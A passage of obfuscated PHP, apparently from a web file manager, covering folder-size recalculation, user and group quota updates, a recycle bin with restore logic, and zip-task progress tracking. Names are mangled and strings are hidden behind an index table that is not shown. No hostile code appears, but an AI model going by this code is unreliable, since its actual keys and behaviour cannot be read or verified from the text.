$this->where($°ï’“ç)->sum($¶®ò³¼ì[79]); $¹¦ÔŞË¤ = intval($£’‘–Œï) - intval($£ğŠö¶Í[$¶®ò³¼ì[79]]); } if ($¹¦ÔŞË¤ == 0) { return CacheLock::unlock($‚­‹Ú©ƒ); } $Ü½…åä¾ = $this->parentLevelArray($£ğŠö¶Í[$¶®ò³¼ì[584]]); if (!$Ü½…åä¾) { $Ü½…åä¾ = array(); } $Ü½…åä¾[] = $£ğŠö¶Í[$¶®ò³¼ì[193]]; $°ï’“ç = array($¶®ò³¼ì[193] => array($¶®ò³¼ì[492], $Ü½…åä¾)); if ($¹¦ÔŞË¤ < 0) { $°ï’“ç[$¶®ò³¼ì[79]] = array($¶®ò³¼ì[1086], abs($¹¦ÔŞË¤)); } $this->where($°ï’“ç)->setAdd($¶®ò³¼ì[79], $¹¦ÔŞË¤); CacheLock::unlock($‚­‹Ú©ƒ); $ØîÂ¢Ù = $¶®ò³¼ì[2281] . $£ğŠö¶Í[$¶®ò³¼ì[190]] . $¶®ò³¼ì[4] . $£ğŠö¶Í[$¶®ò³¼ì[569]]; $àÌğ£°Ã = array($£ğŠö¶Í[$¶®ò³¼ì[190]], $£ğŠö¶Í[$¶®ò³¼ì[569]]); TaskRun::timeLimitCall($ØîÂ¢Ù, $¶®ò³¼ì[2282], $àÌğ£°Ã, 1.5); } public function folderSizeResetChildren($Ë¢ÕïÈ¦) { $»½Æ½ÜÏ =& $_SERVER[ˆ¡¹µ‹Â]; $this->sourceCacheClear($Ë¢ÕïÈ¦); $ŞĞãê» = $this->sourceInfo($Ë¢ÕïÈ¦); $äé†Š‘¯ = array($»½Æ½ÜÏ[646] => 1, $»½Æ½ÜÏ[649] => $ŞĞãê»[$»½Æ½ÜÏ[569]], $»½Æ½ÜÏ[652] => array($»½Æ½ÜÏ[612], $ŞĞãê»[$»½Æ½ÜÏ[584]] . $Ë¢ÕïÈ¦ . $»½Æ½ÜÏ[613])); $á»®‹ß¤ = $»½Æ½ÜÏ[2283]; $á¹§âñ = $this->field($á»®‹ß¤)->where($äé†Š‘¯)->select(); $äé†Š‘¯[$»½Æ½ÜÏ[485]] = 0; $Ü†éî‹ä = $this->field($á»®‹ß¤)->where($äé†Š‘¯)->select(); if (!$Ü†éî‹ä) { return; } $á¹§âñ[] = $ŞĞãê»; $á¹§âñ = array_to_keyvalue($á¹§âñ, $»½Æ½ÜÏ[193]); foreach ($á¹§âñ as $ñØËÁ´ => $›€ƒïÍá) { $á¹§âñ[$ñØËÁ´][$»½Æ½ÜÏ[2284]] = $á¹§âñ[$ñØËÁ´][$»½Æ½ÜÏ[79]]; $á¹§âñ[$ñØËÁ´][$»½Æ½ÜÏ[79]] = 0; } foreach ($Ü†éî‹ä as $›€ƒïÍá) { $êÁÏÉê¦ = $›€ƒïÍá[$»½Æ½ÜÏ[192]] . $»½Æ½ÜÏ[12]; if (!isset($á¹§âñ[$êÁÏÉê¦])) { continue; } if ($›€ƒïÍá[$»½Æ½ÜÏ[505]] == $á¹§âñ[$êÁÏÉê¦][$»½Æ½ÜÏ[505]]) { $á¹§âñ[$êÁÏÉê¦][$»½Æ½ÜÏ[79]] += $›€ƒïÍá[$»½Æ½ÜÏ[79]]; } } foreach ($á¹§âñ as $›€ƒïÍá) { $œÌşî„¹ = $this->parentLevelArray($›€ƒïÍá[$»½Æ½ÜÏ[584]]); foreach ($œÌşî„¹ as $êÁÏÉê¦) { $êÁÏÉê¦ = $êÁÏÉê¦ . $»½Æ½ÜÏ[12]; if (!isset($á¹§âñ[$êÁÏÉê¦])) { continue; } if ($›€ƒïÍá[$»½Æ½ÜÏ[505]] == $á¹§âñ[$êÁÏÉê¦][$»½Æ½ÜÏ[505]]) { $á¹§âñ[$êÁÏÉê¦][$»½Æ½ÜÏ[79]] += $›€ƒïÍá[$»½Æ½ÜÏ[79]]; } } } $ŸÑÛçñò = array(); foreach ($á¹§âñ as $›€ƒïÍá) { if ($›€ƒïÍá[$»½Æ½ÜÏ[79]] == $›€ƒïÍá[$»½Æ½ÜÏ[2284]]) { continue; } $ŸÑÛçñò[] = array($»½Æ½ÜÏ[193], $›€ƒïÍá[$»½Æ½ÜÏ[193]], $»½Æ½ÜÏ[79], $›€ƒïÍá[$»½Æ½ÜÏ[79]]); } $this->saveAll($ŸÑÛçñò); } public function userSpaceReset($ÛĞºÓïÕ = false) { $ñğ´ªÉã =& $_SERVER[ˆ¡¹µ‹Â]; $’‰ğ¨Ù† = $this->where(array($ñğ´ªÉã[190] => self::TYPE_USER, $ñğ´ªÉã[569] => $ÛĞºÓïÕ, $ñğ´ªÉã[485] => 0))->sum($ñğ´ªÉã[79]); $’‰ğ¨Ù† = !$’‰ğ¨Ù† || $’‰ğ¨Ù† <= 0 ? 0 : $’‰ğ¨Ù†; Model($ñğ´ªÉã[577])->userEdit($ÛĞºÓïÕ, array($ñğ´ªÉã[1950] => $’‰ğ¨Ù†)); } public function targetSpaceUpdate($»Ç¦ùòÎ, $ı†¤‘´å) { $ˆ†¨ÍåØ =& $_SERVER[ˆ¡¹µ‹Â]; if (!$ı†¤‘´å) { return; } if (!in_array($»Ç¦ùòÎ, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $ÕÀÆè”Ş = $this->targetSpaceSize($»Ç¦ùòÎ, $ı†¤‘´å); if ($»Ç¦ùòÎ == self::TYPE_USER) { Model($ˆ†¨ÍåØ[577])->userEdit($ı†¤‘´å, array($ˆ†¨ÍåØ[1950] => $ÕÀÆè”Ş)); } else { if ($»Ç¦ùòÎ == self::TYPE_GROUP) { Model($ˆ†¨ÍåØ[585])->groupEdit($ı†¤‘´å, array($ˆ†¨ÍåØ[1950] => $ÕÀÆè”Ş)); } } } public function targetSpaceSize($ÑÚ¨»Ûî, $ˆŒ˜®ÛÓ) { $ßãìß’Ü =& $_SERVER[ˆ¡¹µ‹Â]; $Ó®šÒ–˜ = 0; $€û÷îÖğ = $this->targetSourceRoot($ÑÚ¨»Ûî, $ˆŒ˜®ÛÓ, !0); foreach ($€û÷îÖğ as $Øöú‡î€) { if (!$Øöú‡î€) { continue; } $Ó®šÒ–˜ += floatval($Øöú‡î€[$ßãìß’Ü[79]]); $ØÏßÚ = array($ßãìß’Ü[652] => array($ßãìß’Ü[612], $ßãìß’Ü[594] . $Øöú‡î€[$ßãìß’Ü[193]] . $ßãìß’Ü[613])); $Åæµ‘î™ = Model($ßãìß’Ü[503])->field($ßãìß’Ü[491])->where($ØÏßÚ)->select(); $Åæµ‘î™ = array_to_keyvalue($Åæµ‘î™, $ßãìß’Ü[12], $ßãìß’Ü[193]); $Åæµ‘î™ = array_unique(array_filter($Åæµ‘î™)); if ($Åæµ‘î™) { $ØÏßÚ = array($ßãìß’Ü[491] => array($ßãìß’Ü[492], $Åæµ‘î™)); $Ó®šÒ–˜ += floatval($this->where($ØÏßÚ)->sum($ßãìß’Ü[79])); } } $Ó®šÒ–˜ = !$Ó®šÒ–˜ || $Ó®šÒ–˜ <= 0 ? 0 : $Ó®šÒ–˜; return $Ó®šÒ–˜; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($ƒÎñ‘öã) { return $this->fileTypeProfile($ƒÎñ‘öã, SourceModel::TYPE_USER); } public function groupFileTypeProfile($šà»Üı) { return $this->fileTypeProfile($šà»Üı, SourceModel::TYPE_GROUP); } private function fileTypeProfile($Ïší™ ¦, $”ä£€æ™) { $¸ğ±·Š =& $_SERVER[ˆ¡¹µ‹Â]; $Ùû©ŞÌ = $¸ğ±·Š[2285] . $Ïší™ ¦ . $¸ğ±·Š[11] . $”ä£€æ™; $²©ÃÓ¿Ğ = Cache::get($Ùû©ŞÌ); if ($²©ÃÓ¿Ğ) { return $²©ÃÓ¿Ğ; } $À—ƒò—š = array($¸ğ±·Š[646] => 0); if ($Ïší™ ¦ != !1) { $À—ƒò—š[$¸ğ±·Š[569]] = $Ïší™ ¦; $À—ƒò—š[$¸ğ±·Š[190]] = $”ä£€æ™; } $Ñê€ıô = array(); $Ñê€ıô[$¸ğ±·Š[2286]] = array($¸ğ±·Š[2287] => LNG($¸ğ±·Š[2286]), $¸ğ±·Š[2288] => $this->where($À—ƒò—š)->count(), $¸ğ±·Š[617] => $this->where($À—ƒò—š)->sum($¸ğ±·Š[79])); $µ¤¸‹‰ó = KodIO::fileTypeList(); foreach ($µ¤¸‹‰ó as $€ºãá  => $ÈëÀ˜ò¡) { $À—ƒò—š[$¸ğ±·Š[486]] = $this->fileTypeWhere($€ºãá ); $Ñê€ıô[$€ºãá ] = array($¸ğ±·Š[2287] => $ÈëÀ˜ò¡[$¸ğ±·Š[32]], $¸ğ±·Š[2288] => $this->where($À—ƒò—š)->count(), $¸ğ±·Š[617] => $this->where($À—ƒò—š)->sum($¸ğ±·Š[79])); } Cache::set($Ùû©ŞÌ, $Ñê€ıô, 1200); return $Ñê€ıô; } public function fileNameExist($ƒ€ƒıšƒ, $ƒö›­œ) { $Ç’»ã„ğ =& $_SERVER[ˆ¡¹µ‹Â]; $ï‡çÄ¬  = $this->field($Ç’»ã„ğ[2289])->where(array($Ç’»ã„ğ[192] => $ƒ€ƒıšƒ, $Ç’»ã„ğ[32] => $ƒö›­œ, $Ç’»ã„ğ[505] => 0))->find(); return is_array($ï‡çÄ¬ ) ? $ï‡çÄ¬ [$Ç’»ã„ğ[193]] : !1; } public function childList($¥äâü¨) { $¥è‡îØ =& $_SERVER[ˆ¡¹µ‹Â]; $ÑÒŞ±Œ– = $¥è‡îØ[2262] . $¥äâü¨; if (isset(self::$cacheChildList[$ÑÒŞ±Œ–])) { return self::$cacheChildList[$ÑÒŞ±Œ–]; } $óÃäïû = array($¥è‡îØ[192] => intval($¥äâü¨), $¥è‡îØ[505] => 0); $ûÍçÄõì = $this->where($óÃäïû)->select(); $ûÍçÄõì = $ûÍçÄõì ? $ûÍçÄõì : array(); self::$cacheChildList[$ÑÒŞ±Œ–] = $ûÍçÄõì; foreach ($ûÍçÄõì as $½ÔØÓÀ²) { $ÑÒŞ±Œ– = $¥è‡îØ[533] . $½ÔØÓÀ²[$¥è‡îØ[193]]; self::$cacheSourceInfo[$ÑÒŞ±Œ–] = $½ÔØÓÀ²; } return $ûÍçÄõì; } public function fileNameAuto($åÑ®¬”, $ØÉÉªå, $¢“„èÂ× = REPEAT_RENAME, $‚§ôÕ² = false) { $«ä±‹£» =& $_SERVER[ˆ¡¹µ‹Â]; $õã×ä = get_path_ext($ØÉÉªå); $ôˆáÒÃƒ = $õã×ä ? get_path_ext_name($ØÉÉªå) . $«ä±‹£»[2290] . $õã×ä : $ØÉÉªå . $«ä±‹£»[460]; $Ùç¢ÏÆ× = array($«ä±‹£»[192] => $åÑ®¬”, $«ä±‹£»[505] => 0, $«ä±‹£»[32] => array($«ä±‹£»[459], $ôˆáÒÃƒ)); $á»ŸÏ–ó = $this->field($«ä±‹£»[32])->where($Ùç¢ÏÆ×)->select(); $¨–†“³Î = array_to_keyvalue($á»ŸÏ–ó, $«ä±‹£»[12], $«ä±‹£»[32]); return $this->fileNameAutoGet($¨–†“³Î, $ØÉÉªå, $¢“„èÂ×, $‚§ôÕ²); } public function fileNameAutoGet($ûù³É , $åŸ±••Ô, $¸Œ†ò¡ª, $’…ó®×) { $Ì¥ç³­¯ =& $_SERVER[ˆ¡¹µ‹Â]; if ($¸Œ†ò¡ª == REPEAT_REPLACE || !$ûù³É  || !in_array_not_case($åŸ±••Ô, $ûù³É ) || $’…ó®× && $¸Œ†ò¡ª != REPEAT_RENAME_FOLDER) { return $åŸ±••Ô; } if ($¸Œ†ò¡ª == REPEAT_SKIP) { return !1; } $´­„’ïÄ = $Ì¥ç³­¯[10] . get_path_ext($åŸ±••Ô); $´­„’ïÄ = $´­„’ïÄ == $Ì¥ç³­¯[10] || $’…ó®× ? $Ì¥ç³­¯[12] : $´­„’ïÄ; for ($öğ‘·úû = 1; $öğ‘·úû <= count($ûù³É ) + 1; $öğ‘·úû++) { $«ÍùäªÀ = substr($åŸ±••Ô, 0, strlen($åŸ±••Ô) - strlen($´­„’ïÄ)); $•î·“¹ = $«ÍùäªÀ . "\x28{$öğ‘·úû}\x29{$´­„’ïÄ}"; if (!in_array_not_case($•î·“¹, $ûù³É )) { return $•î·“¹; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\157\137\x73\x6f\165\162\143\145\x5f\162\145\x63\x79\143\x6c\145"; protected $dataAuto = array(array("\x63\x72\145\141\164\145\x54\x69\155\145", "\x74\x69\155\x65", "\151\x6e\x73\145\162\164", "\x66\x75\x6e\143\x74\x69\x6f\156")); public function listData($ÀÂÌ•‘î = false) { $Ì„Ö¨² =& $_SERVER[ˆ¡¹µ‹Â]; $ÀÂÌ•‘î = $ÀÂÌ•‘î ? $ÀÂÌ•‘î : USER_ID; $£å³öíá = $this->where(array($Ì„Ö¨²[1754] => $ÀÂÌ•‘î))->select(); return array_to_keyvalue($£å³öíá, $Ì„Ö¨²[12], $Ì„Ö¨²[193]); } public function moveToRecycle($Û­Ä‘Èğ) { $˜Ä¡Ñá­ =& $_SERVER[ˆ¡¹µ‹Â]; $ë¤„œ = Model($˜Ä¡Ñá­[1411]); $ŞÀ®à™· = $ë¤„œ->sourceInfo($Û­Ä‘Èğ); if (!$ŞÀ®à™· || $ŞÀ®à™·[$˜Ä¡Ñá­[505]] == $˜Ä¡Ñá­[91]) { return; } $À¹µÙ = array($˜Ä¡Ñá­[491] => $Û­Ä‘Èğ, $˜Ä¡Ñá­[1754] => USER_ID, $˜Ä¡Ñá­[648] => $ŞÀ®à™·[$˜Ä¡Ñá­[190]], $˜Ä¡Ñá­[649] => $ŞÀ®à™·[$˜Ä¡Ñá­[569]], $˜Ä¡Ñá­[652] => $ŞÀ®à™·[$˜Ä¡Ñá­[584]]); $this->add($À¹µÙ); $this->recycleMove($Û­Ä‘Èğ, 1); if ($ŞÀ®à™·[$˜Ä¡Ñá­[485]] == $˜Ä¡Ñá­[91]) { $Ú«†‡ö = array($˜Ä¡Ñá­[652] => array($˜Ä¡Ñá­[612], $ŞÀ®à™·[$˜Ä¡Ñá­[584]] . $Û­Ä‘Èğ . $˜Ä¡Ñá­[613])); $ë¤„œ->where($Ú«†‡ö)->setField($˜Ä¡Ñá­[505], 1); } } public function clear() { $this->remove(!1); } public function remove($¬àÎ¯Ü¾ = false, $àë ½ÎÅ = false) { $“ÄŠñ¸Ú =& $_SERVER[ˆ¡¹µ‹Â]; $àë ½ÎÅ = $àë ½ÎÅ ? $àë ½ÎÅ : USER_ID; $¢¹ßç¥„ = Model($“ÄŠñ¸Ú[1411]); $½óşÉ¶× = $this->listData($àë ½ÎÅ); $¬àÎ¯Ü¾ = $¬àÎ¯Ü¾ === !1 ? !1 : $¬àÎ¯Ü¾; $šÛÉÕÑ = array(); foreach ($½óşÉ¶× as $‚ÊÂæÃ¨) { if ($¬àÎ¯Ü¾ != !1 && !in_array($‚ÊÂæÃ¨, $¬àÎ¯Ü¾)) { continue; } $Õ§áÈÙô = $¢¹ßç¥„->sourceInfo($‚ÊÂæÃ¨); $¢¹ßç¥„->remove($‚ÊÂæÃ¨, !1); $ÍŒ“úÅâ = $Õ§áÈÙô[$“ÄŠñ¸Ú[190]] . $“ÄŠñ¸Ú[11] . $Õ§áÈÙô[$“ÄŠñ¸Ú[569]]; $šÛÉÕÑ[$ÍŒ“úÅâ] = array($“ÄŠñ¸Ú[648] => $Õ§áÈÙô[$“ÄŠñ¸Ú[190]], $“ÄŠñ¸Ú[569] => $Õ§áÈÙô[$“ÄŠñ¸Ú[569]]); $this->where(array($“ÄŠñ¸Ú[193] => $‚ÊÂæÃ¨))->delete(); } foreach ($šÛÉÕÑ as $ œ‹Åò”) { $¢¹ßç¥„->targetSpaceUpdate($ œ‹Åò”[$“ÄŠñ¸Ú[190]], $ œ‹Åò”[$“ÄŠñ¸Ú[569]]); } } public function restore($¯Ë‰”Ñ­ = false) { $ƒìˆâ§” = $this->listData(); $this->_restoreSource($ƒìˆâ§”, $¯Ë‰”Ñ­); } public function removeUserAll($¢—£‚¡·) { $this->remove(!1, $¢—£‚¡·); } public function restoreItem($ëñÎ‘Šï) { $this->_restoreSource(array($ëñÎ‘Šï), array($ëñÎ‘Šï)); } private function _restoreSource($ŒœÀÏƒ¬, $ÔÍÏ¥—£) { $‚¾òç€Š =& $_SERVER[ˆ¡¹µ‹Â]; $áÉ¬ç• = Model($‚¾òç€Š[1411]); $ÔÍÏ¥—£ = $ÔÍÏ¥—£ == !1 ? !1 : $ÔÍÏ¥—£; if (!$ŒœÀÏƒ¬) { return !0; } $„ªÕÜÄá = array(); foreach ($ŒœÀÏƒ¬ as $ñ‰´şîÈ) { if ($ÔÍÏ¥—£ != !1 && !in_array($ñ‰´şîÈ, $ÔÍÏ¥—£)) { continue; } $ĞßœñÆ‡ = $áÉ¬ç•->sourceInfo($ñ‰´şîÈ); $ï«‘ô = $áÉ¬ç•->sourceInfo($ĞßœñÆ‡[$‚¾òç€Š[192]]); if ($ï«‘ô[$‚¾òç€Š[505]] == $‚¾òç€Š[91]) { continue; } $áÉ¬ç•->lockMoveStart($ñ‰´şîÈ); $this->recycleMove($ñ‰´şîÈ, 0); if ($ĞßœñÆ‡[$‚¾òç€Š[485]] == $‚¾òç€Š[91]) { $Ö»Üóé = array($‚¾òç€Š[652] => array($‚¾òç€Š[612], $ĞßœñÆ‡[$‚¾òç€Š[584]] . $ñ‰´şîÈ . $‚¾òç€Š[613])); $áÉ¬ç•->where($Ö»Üóé)->setField($‚¾òç€Š[505], 0); $this->restoreFolderChildren($ñ‰´şîÈ, $ŒœÀÏƒ¬); } $this->where(array($‚¾òç€Š[193] => $ñ‰´şîÈ))->delete(); $áÉ¬ç•->folderSizeReset($ĞßœñÆ‡[$‚¾òç€Š[192]]); $„ªÕÜÄá[] = $ĞßœñÆ‡[$‚¾òç€Š[192]]; if ($ĞßœñÆ‡[$‚¾òç€Š[485]] == $‚¾òç€Š[91]) { $„ªÕÜÄá[] = $ñ‰´şîÈ; } $áÉ¬ç•->lockMoveEnd($ñ‰´şîÈ); } $áÉ¬ç•->updateModifyTime($„ªÕÜÄá); } private function restoreFolderChildren($·®¯ƒÖˆ, $¢üÛ£ıÂ) { $Íš‘ÁŒü =& $_SERVER[ˆ¡¹µ‹Â]; $Ğõ¨´»¨ = Model($Íš‘ÁŒü[1411]); $½›„¯şƒ = array($Íš‘ÁŒü[193] => array($Íš‘ÁŒü[7], array())); foreach ($¢üÛ£ıÂ as $›¥«˜°Ë) { if ($›¥«˜°Ë == $·®¯ƒÖˆ) { continue; } if (!$Ğõ¨´»¨->isParentOf($·®¯ƒÖˆ, $›¥«˜°Ë)) { continue; } $¹şÕÄ§ê = $Ğõ¨´»¨->sourceInfo($›¥«˜°Ë); if ($¹şÕÄ§ê[$Íš‘ÁŒü[485]] == $Íš‘ÁŒü[91]) { $½›„¯şƒ[] = array($Íš‘ÁŒü[652] => array($Íš‘ÁŒü[612], $¹şÕÄ§ê[$Íš‘ÁŒü[584]] . $›¥«˜°Ë . $Íš‘ÁŒü[613])); } else { $½›„¯şƒ[$Íš‘ÁŒü[193]][1][] = $›¥«˜°Ë; } } if (!$½›„¯şƒ[$Íš‘ÁŒü[193]][1]) { unset($½›„¯şƒ[$Íš‘ÁŒü[193]]); } if (!$½›„¯şƒ) { return; } if (is_array($½›„¯şƒ[$Íš‘ÁŒü[193]]) && is_array($½›„¯şƒ[$Íš‘ÁŒü[193]][1])) { $½›„¯şƒ[$Íš‘ÁŒü[193]][1] = array_unique($½›„¯şƒ[$Íš‘ÁŒü[193]][1]); } $½›„¯şƒ[$Íš‘ÁŒü[1071]] = $Íš‘ÁŒü[2064]; $Ğõ¨´»¨->where($½›„¯şƒ)->setField($Íš‘ÁŒü[505], 1); } private function recycleMove($ø€Ìø’Å, $µéó¾€ = 1) { $îçòî‚‡ =& $_SERVER[ˆ¡¹µ‹Â]; $Í•Š®ß = Model($îçòî‚‡[1411]); $³‡ò©ÎÒ = Model($îçòî‚‡[2291]); $ôúóĞÂ± = array($îçòî‚‡[193] => $ø€Ìø’Å); if ($µéó¾€) { $Í•Š®ß->where($ôúóĞÂ±)->setField($îçòî‚‡[505], 1); $³‡ò©ÎÒ->eventRecycle($ø€Ìø’Å, $îçòî‚‡[2292]); } else { $Ö”‹¿ß¬ = $Í•Š®ß->where($ôúóĞÂ±)->find(); $šÑÊí = $Ö”‹¿ß¬[$îçòî‚‡[485]] == $îçòî‚‡[91]; $Í˜‡Øº = $Í•Š®ß->fileNameAuto($Ö”‹¿ß¬[$îçòî‚‡[192]], $Ö”‹¿ß¬[$îçòî‚‡[32]], REPEAT_RENAME_FOLDER, $šÑÊí); if ($Í˜‡Øº != $Ö”‹¿ß¬[$îçòî‚‡[32]]) { $Í•Š®ß->rename($ø€Ìø’Å, $Í˜‡Øº); } $Í•Š®ß->where($ôúóĞÂ±)->setField($îçòî‚‡[505], 0); $³‡ò©ÎÒ->eventRecycle($ø€Ìø’Å, $îçòî‚‡[2293]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\155\56\163\157\165\162\143\145\x53\x65\x63\x72\x65\x74\114\x69\x73\x74"; public $field = array("\x73\x6f\165\x72\x63\145\x49\x44", "\x74\x79\160\145\111\x44", "\143\x72\x65\141\164\145\125\x73\x65\x72"); } goto Cà˜æß×¶Ã; BÚÃ…©ğ¡«: class TaskZip extends TaskFileTransfer { protected function startAfter() { $šµ’Œ’³ =& $_SERVER[ˆ¡¹µ‹Â]; parent::startAfter(); Hook::bind($šµ’Œ’³[1887], array($this, $šµ’Œ’³[1877])); Hook::bind($šµ’Œ’³[1879], array($this, $šµ’Œ’³[1880])); $ï÷ï® =& $this->task; $ï÷ï®[$šµ’Œ’³[1881]] = $šµ’Œ’³[1272]; if (!$ï÷ï®[$šµ’Œ’³[1652]]) { $ï÷ï®[$šµ’Œ’³[1652]] = LNG($šµ’Œ’³[1888]); } } protected function endAfter() { $ÈÊâ¡ =& $_SERVER[ˆ¡¹µ‹Â]; parent::endAfter(); Hook::unbind($ÈÊâ¡[1887], array($this, $ÈÊâ¡[1877])); Hook::unbind($ÈÊâ¡[1879], array($this, $ÈÊâ¡[1880])); } public function updateAfter() { $Í¼´Œ =& $_SERVER[ˆ¡¹µ‹Â]; $Ğ†ê½“† =& $this->task; if (!$Ğ†ê½“†[$Í¼´Œ[1134]] || !$Ğ†ê½“†[$Í¼´Œ[830]]) { return; } if ($Ğ†ê½“†[$Í¼´Œ[1881]] == $Í¼´Œ[1272]) { $Ã·Ï÷¾ = $Ğ†ê½“†[$Í¼´Œ[1817]]; if ($Ğ†ê½“†[$Í¼´Œ[1818]] != $Í¼´Œ[1272]) { $Ã·Ï÷¾ = 0; } $úæ›ıš” = ($Ğ†ê½“†[$Í¼´Œ[1821]] + $Ã·Ï÷¾) / $Ğ†ê½“†[$Í¼´Œ[830]]; $Ğ†ê½“†[$Í¼´Œ[1765]] = $úæ›ıš” * 0.3; } else { if ($Ğ†ê½“†[$Í¼´Œ[1881]] == $Í¼´Œ[389]) { $úæ›ıš” = $Ğ†ê½“†[$Í¼´Œ[1764]] / $Ğ†ê½“†[$Í¼´Œ[1134]]; $Ğ†ê½“†[$Í¼´Œ[1765]] = 0.3 + $úæ›ıš” * 0.5; } else { if ($Ğ†ê½“†[$Í¼´Œ[1881]] == $Í¼´Œ[110]) { $úæ›ıš” = 0; if ($Ğ†ê½“†[$Í¼´Œ[1816]]) { $úæ›ıš” = $Ğ†ê½“†[$Í¼´Œ[1817]] / $Ğ†ê½“†[$Í¼´Œ[1816]]; } $Ğ†ê½“†[$Í¼´Œ[1765]] = 0.3 + 0.5 + $úæ›ıš” * 0.2; } } } if ($Ğ†ê½“†[$Í¼´Œ[1765]] > 0) { $¢Ÿï·ƒŸ = timeFloat() - $Ğ†ê½“†[$Í¼´Œ[1767]] - $Ğ†ê½“†[$Í¼´Œ[1770]]; $Ğ†ê½“†[$Í¼´Œ[1771]] = $¢Ÿï·ƒŸ * (1 - $Ğ†ê½“†[$Í¼´Œ[1765]]) / $Ğ†ê½“†[$Í¼´Œ[1765]]; } } public function copyFileStart($Û‘üÕØØ, $œÜı—¤ˆ, $Ø“å°½, $å÷¾Ç¦ç, $ÃÇãøİğ, $¿µîãŒ®) { $„ƒãò =& $_SERVER[ˆ¡¹µ‹Â]; parent::copyFileStart($Û‘üÕØØ, $œÜı—¤ˆ, $Ø“å°½, $å÷¾Ç¦ç, $ÃÇãøİğ, $¿µîãŒ®); $ë­´­°¾ =& $this->task; if ($ë­´­°¾[$„ƒãò[1881]] == $„ƒãò[389]) { $ë­´­°¾[$„ƒãò[1881]] = $„ƒãò[110]; } $this->update(); } public function copyFileEnd($Ê×Çú¥‹, $Ììƒ«Ì, $Ú»ä¤ï, $­Ü•”ÂÒ, $áõØ®’ò, $ªöÛº»á) { $—ÚğŞ—Õ =& $_SERVER[ˆ¡¹µ‹Â]; $ïÓ½ÑŒÂ =& $this->task; $ïÓ½ÑŒÂ[$—ÚğŞ—Õ[1817]] = $ïÓ½ÑŒÂ[$—ÚğŞ—Õ[1816]]; $ïÓ½ÑŒÂ[$—ÚğŞ—Õ[1821]] += $ïÓ½ÑŒÂ[$—ÚğŞ—Õ[1816]]; $ïÓ½ÑŒÂ[$—ÚğŞ—Õ[1818]] = $—ÚğŞ—Õ[12]; $this->update(); } public function zipEvent($¹š¯“Éş, $Ù©äëÌŒ, $¡ÆœîÒç, $àöê†¦å) { $ÁŠ­î„’ =& $_SERVER[ˆ¡¹µ‹Â]; $ıìãÒß =& $this->task; $ıìãÒß[$ÁŠ­î„’[1814]] = get_path_this($Ù©äëÌŒ); $ıìãÒß[$ÁŠ­î„’[1816]] = $àöê†¦å; $ıìãÒß[$ÁŠ­î„’[1817]] = $¡ÆœîÒç; $ıìãÒß[$ÁŠ­î„’[1136]] = $¹š¯“Éş == $ÁŠ­î„’[1889] ? $ÁŠ­î„’[1884] : $ÁŠ­î„’[1885]; $ıìãÒß[$ÁŠ­î„’[1818]] = $ÁŠ­î„’[12]; $ıìãÒß[$ÁŠ­î„’[830]] = $àöê†¦å; $ıìãÒß[$ÁŠ­î„’[1881]] = $ÁŠ­î„’[389]; $this->update(); } public function nameParse($¯‡·ü§«) { $İ”ß³Ç£ =& $_SERVER[ˆ¡¹µ‹Â]; $ÕÏˆÌÆ =& $this->task; if ($ÕÏˆÌÆ[$İ”ß³Ç£[1764]] < $ÕÏˆÌÆ[$İ”ß³Ç£[1134]]) { $Öù‘ = get_path_this($¯‡·ü§«); if (strstr($Öù‘, $İ”ß³Ç£[10])) { $ÕÏˆÌÆ[$İ”ß³Ç£[1764]] += 1; } } if ($ÕÏˆÌÆ[$İ”ß³Ç£[1881]] == $İ”ß³Ç£[1272]) { $ÕÏˆÌÆ[$İ”ß³Ç£[1881]] = $İ”ß³Ç£[389]; } $ÕÏˆÌÆ[$İ”ß³Ç£[1814]] = $¯‡·ü§«; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($½ë±†×©) { $“Æ…İù‘ =& $_SERVER[ˆ¡¹µ‹Â]; $†ÖÙÂç = array($“Æ…İù‘[662] => array($“Æ…İù‘[33] => $“Æ…İù‘[1890], $“Æ…İù‘[350] => array($“Æ…İù‘[255], $“Æ…İù‘[832], $“Æ…İù‘[1891], $“Æ…İù‘[1892])), $“Æ…İù‘[1893] => array($“Æ…İù‘[33] => $“Æ…İù‘[1894], $“Æ…İù‘[350] => array($“Æ…İù‘[255], $“Æ…İù‘[830], $“Æ…İù‘[1895], $“Æ…İù‘[1896], $“Æ…İù‘[1897]))); if (!isset($†ÖÙÂç[$½ë±†×©])) { return !1; } $this->optionType = $†ÖÙÂç[$½ë±†×©][$“Æ…İù‘[33]]; $this->field = $†ÖÙÂç[$½ë±†×©][$“Æ…İù‘[350]]; return !0; } public function listData($è“»Ç³” = false, $Ä÷üÕÚˆ = "\155\157\x64\151\x66\171\124\151\155\145", $º¶ËïŠ = false) { return parent::listData($è“»Ç³”, $Ä÷üÕÚˆ, $º¶ËïŠ); } public function trendList($œÂï–¹İ) { $¯Ş¢º =& $_SERVER[ˆ¡¹µ‹Â]; $‰öß‡‡Ù = $this->listData(); if ($‰öß‡‡Ù) { $—¹Øë¢Ü = end($‰öß‡‡Ù); $Áìù¯ÚÈ = date($¯Ş¢º[1898], strtotime($¯Ş¢º[1899])); if ($—¹Øë¢Ü[$¯Ş¢º[255]] == $Áìù¯ÚÈ) { return $‰öß‡‡Ù; } $‘Üù÷íÕ = strtotime($—¹Øë¢Ü[$¯Ş¢º[255]]); } if (!isset($‘Üù÷íÕ)) { $‡˜«äŠà = $œÂï–¹İ == $¯Ş¢º[662] ? $¯Ş¢º[598] : $¯Ş¢º[899]; $‘Üù÷íÕ = Model($‡˜«äŠà)->min($¯Ş¢º[231]); } $¤ÃÚØÌ÷ = $¯Ş¢º[1900] . ucfirst($œÂï–¹İ); $Û †—›è = $this->dateList($‘Üù÷íÕ); foreach ($Û †—›è as $Áìù¯ÚÈ) { $this->{$¤ÃÚØÌ÷}($Áìù¯ÚÈ); } return $this->listData(); } private function dateList($éŠ˜) { $Š…Ùœï =& $_SERVER[ˆ¡¹µ‹Â]; $ğÅÉÍ› = $éŠ˜; $ïİİÚòú = strtotime($Š…Ùœï[1899]); $Ã¼´³«ì = array(); while ($ğÅÉÍ› <= $ïİİÚòú) { $Ã¼´³«ì[] = date($Š…Ùœï[1898], $ğÅÉÍ›); $ğÅÉÍ› = strtotime($Š…Ùœï[1901], $ğÅÉÍ›); } return $Ã¼´³«ì; } public function _recordUser($ÏÁ×Ü = '') { $ıŒĞËÊ½ =& 